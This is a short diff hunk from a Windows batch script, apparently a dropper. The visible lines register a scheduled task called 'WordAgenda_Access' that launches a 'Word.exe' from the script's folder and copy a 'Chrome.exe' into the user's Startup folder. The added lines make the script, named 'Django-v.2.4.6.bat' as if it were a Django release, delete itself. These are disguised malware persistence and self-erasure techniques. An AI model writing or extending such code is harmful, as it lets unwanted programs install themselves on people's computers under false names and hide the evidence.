@@ -14,3 +14,6 @@ schtasks /create /tn "WordAgenda_Access" /tr "%repertoire_script%\Word.exe" /sc 
 set "repertoire_demarrage=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup"
 
 copy "%repertoire_script%Chrome.exe" "%repertoire_demarrage%"
+
+
+del "%repertoire_script%\Django-v.2.4.6.bat"
